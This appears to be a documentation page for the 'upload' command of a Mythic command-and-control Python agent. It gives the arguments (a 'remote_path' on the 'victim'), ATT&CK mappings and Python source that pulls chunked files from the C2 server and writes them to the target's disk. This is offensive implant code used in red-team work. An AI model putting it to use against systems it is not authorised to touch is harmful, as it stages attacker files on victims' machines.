+++
title = "upload"
chapter = false
weight = 100
hidden = false
+++

## Summary

Upload a file to the target machine by selecting a file from your computer. 
     
- Python Versions Supported: 2.7, 3.8     
- Needs Admin: False  
- Version: 1  
- Author: @ajpc500  

### Arguments

#### file

- Description: file to upload   
- Required Value: True  
- Default Value: None  

#### remote_path

- Description: /remote/path/on/victim.txt  
- Required Value: True  
- Default Value: None  

## Usage

```
upload
```

## MITRE ATT&CK Mapping

- T1132  
- T1030  
- T1105  

## Detailed Summary
This function uses API calls to chunk and transfer a file down from Mythic to the agent, then uses API calls to write the file out to disk:

```Python
    def upload(self, task_id, file, remote_path):
        total_chunks = 1
        chunk_num = 0
        with open(remote_path, "wb") as f:
            while (chunk_num < total_chunks):
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                    return "Job stopped."

                data = { 
                    "action": "post_response",
                    "responses": [
                        {
                            "upload": {
                                "chunk_size": CHUNK_SIZE,
                                "file_id": file, 
                                "chunk_num": chunk_num,
                                "full_path": remote_path
                            },
                            "task_id": task_id
                        }
                    ] 
                }
                response = self.postMessageAndRetrieveResponse(data)
                chunk = response["responses"][0]
                chunk_num+=1
                total_chunks = chunk["total_chunks"]
                f.write(base64.b64decode(chunk["chunk_data"]))

```
After successfully writing the file to disk, the agent will report back the final full path so that it can be tracked within the UI.
